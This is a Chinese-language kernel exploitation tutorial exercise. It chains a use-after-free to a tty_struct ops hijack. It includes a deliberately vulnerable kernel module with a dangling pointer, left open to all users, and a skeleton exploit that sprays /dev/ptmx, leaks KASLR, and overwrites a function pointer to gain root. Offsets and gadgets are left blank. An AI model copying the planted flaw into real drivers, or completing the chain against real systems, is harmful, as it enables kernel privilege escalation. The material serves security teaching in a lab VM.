# 練習 C — UAF → tty_struct ops hijack 完整鏈

> **目標**：把 Part 3 的 heap 利用核心——[Ch 18](./18-uaf-double-free.md) 的 UAF、[Ch 19](./19-spray-objects.md) 的 spray 物件牌庫（尤其 `tty_struct`）、[Ch 21](./21-heap-to-rip.md) 的「heap corruption → 間接呼叫 → 控制流劫持」——拼成一條完整鏈，針對一個**自製的、帶有 object UAF 的 vulnerable module**，走完「觸發 UAF → 確認懸空指標 → 用 `/dev/ptmx` spray tty_struct 佔位 → 透過 tty_struct 裡的已知 kernel 指標 leak 破 KASLR → 覆寫 `tty_operations` 劫持控制流 → 提權 → 穩定化」。完成後你應該能看著一篇真實「UAF 配 tty_struct」的 writeup，認出每一步在骨架裡對應哪個位置，也能說清楚為什麼 CFI/KCFI 之後這條「劫 ops 指標」的經典路要轉向 data-only。

## 背景與動機

這個練習是 Part 3 第一次「把分散的技巧串成一條完整鏈」的實戰。前面幾章各自講了鏈條的一環：

- [Ch 18](./18-uaf-double-free.md) 教你 UAF 的本質——一塊記憶體被 `kfree` 之後，還有指標指著它（dangling pointer），而 SLUB 會把這塊記憶體交給下一個同 size 的 `kmalloc` 請求。攻擊者的工作就是**搶在正確的時機，讓「下一個請求」是我選定的、內容可控或結構已知的物件**。
- [Ch 19](./19-spray-objects.md) 給了你一副牌——各種「好用的 spray 物件」。`tty_struct` 是其中最經典的一張：它住在 `kmalloc-1024`（版本相關，實際落點自己用 `pahole` 確認），一打開 `/dev/ptmx` 就配一個，而且它開頭就是一個指向 `tty_operations` 的函式指標表——天生就是「heap → 控制流」的跳板。
- [Ch 21](./21-heap-to-rip.md) 講了這條路的機制與它的黃昏：把一個被解讀成**函式指標**的欄位（`tty->ops` 或 ops 表裡的某個 entry）換成攻擊者的值，kernel 下一次對這個 tty 做 `ioctl`/`close`/`write` 時就會「間接呼叫」到攻擊者指定的位址。這條路曾是 heap 利用的標準終點，CFI/KCFI（[Ch 28](./28-cfi-kcfi.md)）之後大幅褪色。

把這三環接起來，就是本練習要你親手打一遍的東西。

**為什麼用自製 module 而不是真實 CVE**：真實「UAF → tty_struct」的 CVE（例如歷史上 `ptmx`/`n_tty` 相關的若干 bug）要嘛已經修補、重現需要回退到特定舊 kernel，要嘛觸發路徑纏在一大堆 tty line discipline 的狀態機裡，不適合當「第一次串完整鏈」的起點。所以本練習沿用 [Ch 5](./05-first-vulnerable-module.md) 的做法：**自製一個只保留「object UAF」骨架的 vulnerable module**，把 UAF 物件的大小刻意設計成和 `tty_struct` 同 cache，讓你能在**完全受控、可重複、隨時掛 KASAN 重驗**的環境裡，練到和真實題同一種技能——用 tty_struct 佔住 UAF 的洞、從它身上 leak、再從它身上劫控制流。

> **安全與合法性聲明**：以下所有操作都在**你自己擁有的 Linux VM**（建議用 [Ch 0](./00-environment-setup.md) 搭建的 QEMU 環境，或任何你可以隨意摧毀重建的虛擬機）內進行。本練習提供的 module 原始碼**未在本環境實測**（作者環境無可用的 Linux kernel 實驗環境），已盡力確保邏輯正確，但你在自己的 VM 裡編譯、載入、測試時，若發現任何編譯錯誤或行為與描述不符，請以你實測的結果為準，並視為練習的一部分。

## 任務規格

### 目標 module：`tty_uaf`

這個字元裝置提供一個簡化到骨子裡的「物件 UAF」介面：你可以配置一個 object、釋放它、但 module **沒有把指標清空**（典型的 dangling pointer bug），於是釋放後你還能透過 module 殘留的路徑去「用」這塊已經被釋放、可能已被 `tty_struct` 佔走的記憶體。

```c
/* tty_uaf.c —— 練習用的簡化 vulnerable module，製造一個 object UAF，
 * 物件大小刻意對齊 tty_struct 所在的 cache。不是任何真實 kernel 版本的程式碼。 */
#include <linux/module.h>
#include <linux/miscdevice.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/mutex.h>

#define TTYUAF_ALLOC   0x5401   /* 配一個 object */
#define TTYUAF_FREE    0x5402   /* 釋放 object（bug：不清空指標） */
#define TTYUAF_READ    0x5403   /* 從 object 讀出一段（UAF 讀：leak 用） */
#define TTYUAF_WRITE   0x5404   /* 往 object 寫入一段（UAF 寫：劫持用） */
#define TTYUAF_CALL    0x5405   /* 透過 object->fn 做一次間接呼叫（模擬 ops 呼叫） */

/* 刻意把物件撐到接近 1024 bytes，讓它落在 kmalloc-1024——
 * 這正是多數 6.x kernel 上 tty_struct 所在的 cache（版本相關，自己用 pahole 確認）。
 * 真實 tty_struct 的開頭佈局大致是：
 *   int magic; struct kref kref; ... const struct tty_operations *ops; ...
 * 這裡用一個對齊到相同大小、開頭也放一個函式指標的物件去模擬它的角色。 */
struct uaf_obj {
        void (*fn)(struct uaf_obj *self);   /* offset 0：模擬 tty->ops 那個函式指標跳板 */
        unsigned long info;                 /* 給 UAF 讀寫用的欄位 */
        char pad[1024 - sizeof(void *) - sizeof(unsigned long)];
};

static struct uaf_obj *obj;      /* bug：FREE 之後不設回 NULL，形成 dangling pointer */
static DEFINE_MUTEX(uaf_lock);

/* 一個不會被劫持前呼叫到的預設函式，純粹讓 ALLOC 後的 object 有個合法的 fn */
static void uaf_default_fn(struct uaf_obj *self)
{
        self->info = 0x1337;
}

static long ttyuaf_alloc(void)
{
        if (obj)
                return -EEXIST;
        obj = kzalloc(sizeof(*obj), GFP_KERNEL);   /* kmalloc-1024 */
        if (!obj)
                return -ENOMEM;
        obj->fn = uaf_default_fn;
        return 0;
}

static long ttyuaf_free(void)
{
        if (!obj)
                return -EINVAL;
        kfree(obj);           /* ★ bug：釋放了，但下面沒有 obj = NULL ★
                               * 於是 obj 變成懸空指標，後續 READ/WRITE/CALL
                               * 都還會沿著這個指標去碰「已經不屬於 module」的記憶體 */
        return 0;
}

/* UAF 讀：把 object 裡 off..off+len 的內容複製回 user，
 * 若此時這塊記憶體已被 tty_struct 佔走，讀到的就是 tty_struct 的欄位內容 */
static long ttyuaf_read(unsigned long arg)
{
        struct { unsigned int off; unsigned int len; unsigned long uptr; } req;

        if (!obj)
                return -EINVAL;
        if (copy_from_user(&req, (void __user *)arg, sizeof(req)))
                return -EFAULT;
        if (req.off + req.len > sizeof(*obj) || req.len > 512)
                return -EINVAL;
        if (copy_to_user((void __user *)req.uptr, (char *)obj + req.off, req.len))
                return -EFAULT;
        return 0;
}

/* UAF 寫：把 user 的內容寫進 object 的 off 位置，
 * 若此時這塊是 tty_struct，就等於覆寫 tty_struct 的欄位（例如 ops 指標） */
static long ttyuaf_write(unsigned long arg)
{
        struct { unsigned int off; unsigned int len; unsigned long uptr; } req;
        char buf[512];

        if (!obj)
                return -EINVAL;
        if (copy_from_user(&req, (void __user *)arg, sizeof(req)))
                return -EFAULT;
        if (req.off + req.len > sizeof(*obj) || req.len > sizeof(buf))
                return -EINVAL;
        if (copy_from_user(buf, (void __user *)req.uptr, req.len))
                return -EFAULT;
        memcpy((char *)obj + req.off, buf, req.len);
        return 0;
}

/* 透過 object 開頭的函式指標做一次間接呼叫——模擬 kernel 對 tty 做
 * 某個操作時「call tty->ops->xxx」的那一刻。若 fn 已被 WRITE 覆寫，
 * 控制流就轉到攻擊者指定的位址。 */
static long ttyuaf_call(void)
{
        if (!obj)
                return -EINVAL;
        obj->fn(obj);         /* ★ 間接呼叫：heap → RIP 的那一步 ★ */
        return 0;
}

static long ttyuaf_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
{
        long ret;

        mutex_lock(&uaf_lock);
        switch (cmd) {
        case TTYUAF_ALLOC: ret = ttyuaf_alloc(); break;
        case TTYUAF_FREE:  ret = ttyuaf_free(); break;
        case TTYUAF_READ:  ret = ttyuaf_read(arg); break;
        case TTYUAF_WRITE: ret = ttyuaf_write(arg); break;
        case TTYUAF_CALL:  ret = ttyuaf_call(); break;
        default:           ret = -ENOTTY;
        }
        mutex_unlock(&uaf_lock);
        return ret;
}

static const struct file_operations ttyuaf_fops = {
        .unlocked_ioctl = ttyuaf_ioctl,
};

static struct miscdevice ttyuaf_dev = {
        .minor = MISC_DYNAMIC_MINOR,
        .name  = "ttyuaf",
        .fops  = &ttyuaf_fops,
        .mode  = 0666,
};

static int __init ttyuaf_init(void)  { return misc_register(&ttyuaf_dev); }
static void __exit ttyuaf_exit(void) { misc_deregister(&ttyuaf_dev); }

module_init(ttyuaf_init);
module_exit(ttyuaf_exit);
MODULE_LICENSE("GPL");
```

這個 module 刻意把真實 tty 題裡「怎麼觸發 UAF」這段複雜度拿掉（直接給你 `FREE` 一個按鈕），讓你專心練鏈條後半——**佔位、leak、劫控制流、穩定化**，這正是 Part 3 到 Ch 21 真正難、也真正通用的部分。

### 任務要求

| 項目 | 規格 |
|---|---|
| 編譯環境 | 你自己的 Linux VM（建議開 `CONFIG_KASAN`、`CONFIG_SLUB_DEBUG`、先用 `nokaslr nosmap` 跑通再逐步加上 mitigation），對照 [Ch 0](./00-environment-setup.md) |
| 觸發目標 | `ALLOC → FREE`（造出懸空的 `obj`），再用 `/dev/ptmx` spray 讓一個 `tty_struct` 落進同一塊記憶體 |
| 確認佔位 | 用 `TTYUAF_READ` 讀出 object 開頭，比對是否出現 `tty_struct` 的特徵（magic、指向 kernel .data 的 ops 指標） |
| leak 目標 | 透過讀到的 `tty_operations` 位址（或其他已知 kernel 指標）反推 KASLR base |
| 控制流目標 | 用 `TTYUAF_WRITE` 覆寫 object 開頭的函式指標，再 `TTYUAF_CALL` 讓它跳到你選定的位址（`nosmep` 下可先跳 user shellcode，mitigation 全開時走 ROP / data-only） |
| 提權目標 | 最終跑到 `commit_creds(prepare_kernel_cred(0))` 等價效果，回到 userland 拿 root shell（對照 [Ch 12](./21-heap-to-rip.md) 之前學的提權原語） |
| 禁止事項 | 不要求你修好 `tty_uaf.c`——任務是利用它 |

## 期望輸出範例

```
輸入（ioctl 序列）：
  ALLOC                               ← kmalloc-1024 配出 obj
  FREE                                ← kfree(obj)，但 obj 仍懸空
  （spray）開 N 個 /dev/ptmx           ← 讓某個 tty_struct 佔回這塊
  READ(off=0, len=16)                 ← 讀 object 開頭

輸出（預期，取決於你的 kernel 版本 / KASLR 狀態）：
  obj[0x00..0x10] = 01 54 00 00 ...   ← tty_struct 開頭的 magic (TTY_MAGIC = 0x5401) 之類特徵
  ops 指標 = 0xffffffff8xxxxxxx       ← 指向 kernel .rodata 的 tty_operations，可反推 base

劫持：
  WRITE(off=0, 偽造的 fn 值)
  CALL                                ← 間接呼叫跳到偽造位址 → 控制流到手
```

```
邊界輸入：ALLOC → READ（還沒 FREE，正常物件）
輸出：讀到的是 uaf_default_fn 的位址與 info=0（或你 ALLOC 後的初值），
      不是 tty_struct——用來確認「只有 FREE 之後的讀才是 UAF 讀」，
      建立「bug 只在特定狀態下才有意義」的直覺。
```

## 如果你卡住了

1. **先別想 leak 和劫持，先確認「tty_struct 真的佔回了那塊」**。把 spray 數量、spray 時機當成獨立小目標：`FREE` 之後開幾個 `/dev/ptmx`、`READ` 出來的開頭變成 tty 的特徵了嗎？這一步沒穩定，後面全是空中樓閣。
2. **確認你真的開了 KASAN，而且知道它何時會叫**。UAF 讀/寫在 KASAN 下會立刻報 `use-after-free`——但你是**故意**要 UAF 的，所以這裡的 KASAN 報告是你的「確認工具」不是「錯誤」。想用乾淨不報錯的方式打，就得先讓 tty_struct 合法佔回去（佔回之後那塊記憶體 KASAN 認為是「活的 tty_struct」，讀寫就不報 UAF 了）。對照 [Ch 44](./44-debug-toolchain.md)。
3. **leak 卡住就問：我手上哪個欄位是「值固定、指向已知符號」的？** `tty_struct` 的 `ops` 欄位在正常情況下指向 `ptm_unix98_ops`（或 `pty_unix98_ops`，看你開的是 master 還是 slave 端），那是 kernel image 裡位址固定（相對 base）的符號。讀到它的執行期位址 − 它在無 KASLR 下的符號位址 = KASLR slide。先用 `nokaslr` 把符號位址抄下來。
4. **劫持卡住就先降難度**：`nosmep nosmap nokaslr` 全關，把 `fn` 直接寫成你 user 空間一段 shellcode 的位址，`CALL` 看它會不會跳過去（最原始的 ret2usr）。能跳過去，代表你的「覆寫 → 間接呼叫」這一環通了，再逐步加回 mitigation，親眼看每一層逼你換多少招——這正是 README 建議的「打開、打開一半、全開跑三遍」。
5. **穩定性卡住**：把整條鏈包成迴圈跑 20 次，看第幾次開始 spray 佔不回去。多半是「前一輪殘留的 tty 沒關、slab 佈局漂移」——回 [Ch 20](./20-heap-grooming.md) 的 grooming 與 [Ch 45](./45-exploit-stabilization.md) 的 cleanup。

## 實作步驟建議

### Step 1：建置、載入、手動觸發一次 UAF 讀

編譯 `tty_uaf.c` 成 `.ko`，`insmod`，確認 `/dev/ttyuaf` 出現。寫最小 C 程式做 `ALLOC → FREE → READ`，在**沒有** spray 的情況下觀察：KASAN 應該報 `use-after-free read`（因為你讀了一塊剛被釋放的記憶體）。**子目標**：證明你理解這個 module 的狀態機，而且懸空指標 `obj` 確實還能被 `READ`/`WRITE`/`CALL` 碰到。

### Step 2：定性這個原語

列出 `FREE` 之後你實際握有的能力：（a）UAF 讀（`READ`，最多 512 bytes，可選 offset）；（b）UAF 寫（`WRITE`）；（c）UAF 間接呼叫（`CALL`，透過 object 開頭的函式指標）。這三者合起來意味著：只要能讓一個「結構已知」的物件佔回這塊，我就能**讀它（leak）+ 改它（劫持欄位）+ 觸發它（控制流）**。**子目標**：把「有一個 UAF」翻譯成「我能對佔位物件做哪三件具體的事」。

### Step 3：用 `/dev/ptmx` spray `tty_struct` 佔位

`tty_struct` 的配置時機很乾淨——每次 `open("/dev/ptmx", O_RDWR|O_NOCTTY)` 就 `kmalloc` 一個，落在 `kmalloc-1024`（版本相關，用 `pahole tty_struct` 或估算 struct 大小確認它和 `uaf_obj` 同 cache）。做法：`FREE` 之後立刻連開數十個 `/dev/ptmx`，讓其中一個的 `tty_struct` 吃下剛釋放的 slot。用 `READ(off=0)` 讀開頭，比對 tty 特徵（`TTY_MAGIC`、指向 .rodata 的 ops 指標）確認中獎。**子目標**：讓「被釋放的 `obj`」和「某個 `tty_struct`」變成同一塊實體記憶體，並且**能驗證**。

### Step 4：建立 leak 原語，破 KASLR

佔位成功後，`READ` 出 `tty_struct` 裡的 `ops` 欄位（它指向 `ptm_unix98_ops`/`pty_unix98_ops`）。拿執行期位址減去你在 `nokaslr` 下抄好的符號位址，得到 KASLR slide，進而算出 kernel base 與任何你需要的符號（`commit_creds`、`prepare_kernel_cred`、ROP gadget、`init_cred` 等）位址。**子目標**：把「讀一塊 tty_struct 的能力」轉成「一個具體的 KASLR base 數字」。

### Step 5：覆寫 ops 劫持控制流 —— 以及它的黃昏

經典路：`WRITE` 覆寫 `tty_struct->ops`（或更精細地，偽造一張假 ops 表放在可控記憶體，把 `tty->ops` 指過去），然後對那個 fd 做一個會呼叫 ops 的操作（本 module 用 `CALL` 模擬那一刻；真實題裡是 `ioctl`/`close`/`write` 觸發 `tty->ops->ioctl` 等）。

- **`nosmep` + 無 CFI**：把被呼叫的 entry 直接指到 user 空間的 shellcode（ret2usr），或指到一段 kernel ROP chain 的 pivot。
- **SMEP/SMAP 開**：不能跳 user 頁，改讓那個 entry 指向一個 **stack pivot gadget**，把 `rsp` 轉到你用可控物件布好的 fake stack，接著跑 ROP 做 `commit_creds(prepare_kernel_cred(0))` 再走 KPTI trampoline 回 userland（這整套就是 [Ch 21](./21-heap-to-rip.md) 講的「heap → RIP → ROP」經典終點）。
- **CFI/KCFI 開（現代 Hardened 目標的現實）**：`tty->ops` 指向的必須是「簽章相符的合法函式進入點」，你沒辦法把它指到任意 gadget 或 pivot——這條「劫 ops 指標」的路直接被掐死。此時要轉向 [Ch 29](./29-data-only-attack.md) 的 data-only：不劫控制流，改用你的 UAF 寫去改 tty_struct（或 cross-cache 到別的物件）裡的**資料欄位**，或乾脆放棄 tty 這張牌、改用能做 Dirty Pagetable / Dirty Cred 的物件。**這一步要你親身體會 [Ch 28](./28-cfi-kcfi.md) 說的「kernel ROP 路越走越窄」不是口號。**

**子目標**：在 mitigation 全關時打通「覆寫 → 間接呼叫 → 提權」，再逐層加回 mitigation，記錄每一層逼你改用哪一招，並在 CFI 這關誠實承認「這條路斷了，要換 data-only」。

### Step 6：整合與穩定化

把 Step 1–5 串成單一 static-compiled C 執行檔，跑 20 次記錄成功率。低於門檻就回頭查：是不是沒把 spray 用的那些 `/dev/ptmx` fd 在失敗時關掉、污染了下一輪 slab？是不是 grooming 沒先把 cache 填到可預測狀態？對照 [Ch 20](./20-heap-grooming.md) 的 grooming 與 [Ch 45](./45-exploit-stabilization.md) 的 retry/cleanup/避免 panic。**子目標**：把「偶爾會中的 PoC」變成「可重複、不會把 VM 打死的 exploit」——這是 PoC 和真實 exploit 之間真正的差距。

## 完整參考解答

**寫完再看！不要偷看**，否則學不到東西。

<details>
<summary>點開參考實作（骨架 + 關鍵步驟說明，非 turnkey）</summary>

以下是概念骨架，刻意省略精確的 offset、spray 數量、符號位址與 ROP chain——這些全依賴你自己 VM 的 kernel 版本、`tty_struct` 的實際佈局、KASLR 狀態與開了哪些 mitigation，必須自己用 `pahole`/`gdb`/實驗確認後填入。

```c
/* exploit_ttyuaf.c —— 針對 tty_uaf.c 的概念骨架 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define TTYUAF_ALLOC 0x5401
#define TTYUAF_FREE  0x5402
#define TTYUAF_READ  0x5403
#define TTYUAF_WRITE 0x5404
#define TTYUAF_CALL  0x5405

#define NSPRAY 64            /* 依你實測的 slab 行為調整，不是固定值 */

/* 這些 offset / 符號位址全部「依實測填入」——先用 nokaslr + pahole 抄下來 */
#define OFF_TTY_OPS        0 /* tty_struct 裡 ops 指標的 offset，pahole tty_struct 查 */
#define PTM_UNIX98_OPS     0 /* 無 KASLR 下 ptm_unix98_ops 的符號位址 */
#define COMMIT_CREDS       0 /* 無 KASLR 下 commit_creds 符號位址 */
#define PREPARE_KERNEL_CRED 0

static int dev_fd;
static int ptmx_fds[NSPRAY];

struct rw_req { unsigned int off; unsigned int len; unsigned long uptr; };

static void uaf_read(unsigned int off, unsigned int len, void *out)
{
        struct rw_req r = { off, len, (unsigned long)out };
        ioctl(dev_fd, TTYUAF_READ, &r);
}
static void uaf_write(unsigned int off, unsigned int len, void *in)
{
        struct rw_req r = { off, len, (unsigned long)in };
        ioctl(dev_fd, TTYUAF_WRITE, &r);
}

/* Step 1-2：造出懸空指標 */
static void trigger_uaf(void)
{
        ioctl(dev_fd, TTYUAF_ALLOC, 0);
        ioctl(dev_fd, TTYUAF_FREE, 0);   /* obj 懸空，等著被 tty_struct 佔回 */
}

/* Step 3：spray tty_struct 佔位 */
static int spray_tty(void)
{
        for (int i = 0; i < NSPRAY; i++)
                ptmx_fds[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
        /* 驗證佔位：讀開頭看是否出現 tty 特徵（magic / 指向 .rodata 的 ops） */
        unsigned long head[2];
        uaf_read(0, sizeof(head), head);
        /* head[OFF_TTY_OPS/8] 應該落在 kernel .rodata 區間才算中獎——
         * 怎麼判斷「看起來像 kernel 指標」依你的 kernel 位址佈局自己定 */
        return 0 /* 回傳是否中獎，依實測判斷 */;
}

/* Step 4：leak，破 KASLR */
static unsigned long leak_kaslr_base(void)
{
        unsigned long ops_ptr = 0;
        uaf_read(OFF_TTY_OPS, sizeof(ops_ptr), &ops_ptr);
        /* slide = 執行期 ops_ptr − 無 KASLR 下 PTM_UNIX98_OPS 的符號位址 */
        unsigned long slide = ops_ptr - PTM_UNIX98_OPS;
        return slide;   /* kernel base = 無 KASLR base + slide */
}

/* Step 5：覆寫 object 開頭的函式指標，劫控制流 */
static void hijack_control_flow(unsigned long slide)
{
        /* 經典路（mitigation 關）：把 fn 直接寫成一段你準備好的位址。
         * SMEP 開：寫成 stack-pivot gadget，再靠 CALL 轉進 fake stack 跑 ROP。
         * CFI 開：此路不通——改走 data-only（見解答說明）。 */
        unsigned long fake_fn = 0 /* 依你選的路填入：shellcode / pivot gadget */;
        uaf_write(0, sizeof(fake_fn), &fake_fn);
        ioctl(dev_fd, TTYUAF_CALL, 0);   /* 間接呼叫觸發 */
}

int main(void)
{
        dev_fd = open("/dev/ttyuaf", O_RDWR);
        if (dev_fd < 0) { perror("open"); return 1; }

        trigger_uaf();
        if (spray_tty() /* 中獎 */ == 0) {
                unsigned long slide = leak_kaslr_base();
                printf("KASLR slide (概念性，請填實測值): 0x%lx\n", slide);
                hijack_control_flow(slide);
        }
        /* 成功後應已是 root：此處 system("/bin/sh") 或檢查 getuid()==0 */
        return 0;
}
```

**解答說明**：

- `trigger_uaf()` 是唯一「保證重現」的部分——它直接對應 `tty_uaf.c` 的程式邏輯，不依賴任何佈局假設。
- `spray_tty()` / `leak_kaslr_base()` / `hijack_control_flow()` 全部留白，因為它們依賴 `tty_struct` 在**你的 kernel 版本**裡的實際大小與欄位 offset、它落在哪個 kmalloc cache、KASLR/SMEP/SMAP/CFI 開了哪些——這些都不是能寫死的常數，必須用 `pahole tty_struct`、`gdb` 掃符號、手動實驗確認後填入。
- **ops 指標選 master 還是 slave 端**要和你 `open("/dev/ptmx")` 拿到的那一端一致（master 端 ops 通常是 `ptm_unix98_ops`）；讀錯端會讓你的 slide 算錯，leak 整個歪掉。
- **CFI 這關的誠實話**：在開了 kCFI+IBT 的現代 Hardened 目標上，`hijack_control_flow()` 這條「把 fn 指到任意 gadget/pivot」的路會被擋——你覆寫的函式指標指向的位址，必須是一個簽章相符的合法函式進入點。真要在 CFI 下用 tty_struct，就不能劫控制流，要改用 UAF 寫去改**資料**（data-only，[Ch 29](./29-data-only-attack.md)），或換一張能做 Dirty Pagetable / Dirty Cred 的牌（[練習 D](./practice-d-crosscache-dirtypagetable.md) 正是練這個）。這個骨架展示的是「經典路的形狀」，它的黃昏本身就是你要學到的東西。
- 這個骨架**不包含任何提權成功的保證**——它展示流程的形狀，你自己實測填完所有空格，才是你自己的、可重複的 exploit。

</details>

## 測試用例

| 輸入（ioctl 序列） | 預期行為 | 說明 |
|---|---|---|
| `ALLOC → FREE → spray(/dev/ptmx) → READ(0)` | 讀到 tty_struct 特徵（magic/ops 指標） | 主線：確認佔位成功 |
| `ALLOC → READ(0)`（未 FREE） | 讀到 `uaf_default_fn` 位址、`info` 初值，非 tty | 邊界：只有 FREE 後的讀才是 UAF 讀 |
| `ALLOC → FREE → READ(0)`（不 spray，開 KASAN） | KASAN 報 `use-after-free read` | 證明懸空指標確實碰得到已釋放記憶體 |
| `ALLOC → FREE → spray → WRITE(0, 合法 fn) → CALL` | 間接呼叫跳到你寫入的位址 | 控制流劫持這一環打通 |
| `CALL`（從未 ALLOC） | 回傳 `-EINVAL` | 驗證 `obj == NULL` 的基本檢查 |

## 延伸挑戰（加分）

- **CFI 全開，強迫走 data-only**：在 `CONFIG_CFI_CLANG`（kCFI）開啟的 kernel 上重打這題。你會發現 Step 5 的 ops 劫持直接失敗——改用 UAF 寫去修改佔位 tty_struct 的**資料欄位**，或換成能做 Dirty Cred 的物件，體驗 [Ch 28](./28-cfi-kcfi.md)/[Ch 29](./29-data-only-attack.md) 說的範式轉移。
- **偽造整張 ops 表**：不只覆寫單一函式指標，而是在可控記憶體（例如另一個 spray 物件）裡布一張假的 `tty_operations`，把 `tty->ops` 指過去，練習「控制一整組函式指標」而不只一個——這更接近真實題裡劫持的形狀。
- **移植到真實 tty bug 模式**：找一篇真實「UAF → tty_struct」的歷史 writeup，對照本練習的骨架，標出真實題多了哪些東西（line discipline 狀態機、觸發 UAF 的真實路徑、`tty_ldisc` 的生命週期），寫下「我的簡化版拿掉了什麼」。
- **寫一份你自己的 writeup**：照 [Ch 42](./42-patch-to-rootcause.md) 的方法論格式，把你對 `tty_uaf.c` 的分析與利用過程寫成 `vulnerability.md` + `exploit.md` 兩份文件，練習把「我做了什麼」轉成「別人能重現」。

## 自我檢核

- [ ] 能不看程式碼，用自己的話解釋 `tty_uaf.c` 的 bug：為什麼 `FREE` 之後 `obj` 還能被 `READ`/`WRITE`/`CALL` 碰到。
- [ ] 能說出為什麼選 `tty_struct` 當佔位物件（配置時機乾淨、落在 kmalloc-1024、開頭就是指向 ops 的函式指標）。
- [ ] 能描述你怎麼用 `tty_struct` 的 `ops` 欄位反推 KASLR base，以及為什麼它是個好 leak 來源。
- [ ] 能解釋「覆寫 ops → 間接呼叫 → 控制流」這條經典路，以及為什麼 CFI/KCFI 之後它大幅褪色、該轉向 data-only。
- [ ] 跑過至少一次「連續執行 20 次、記錄成功率」的穩定性測試，並能說出不穩定的原因（spray 殘留 / slab 漂移）。
- [ ] 完成至少一項延伸挑戰，特別是「CFI 全開強迫走 data-only」那一項。

這條「UAF → tty_struct → 劫 ops」是 heap 利用最經典的一條完整鏈，你也親眼看到它在 CFI 時代的黃昏。下一個練習把戰場往下拉一層：當 victim 住在**配不出同 cache 可控物件**的專用 slab、而且你要的是繞過一切控制流防禦的**任意實體讀寫**時，cross-cache 怎麼把 page 湊到一起、Dirty Pagetable 怎麼把一個 PTE 覆寫變成拿下整台機器。

→ [練習 D — Cross-cache → Dirty Pagetable 綜合題](./practice-d-crosscache-dirtypagetable.md)
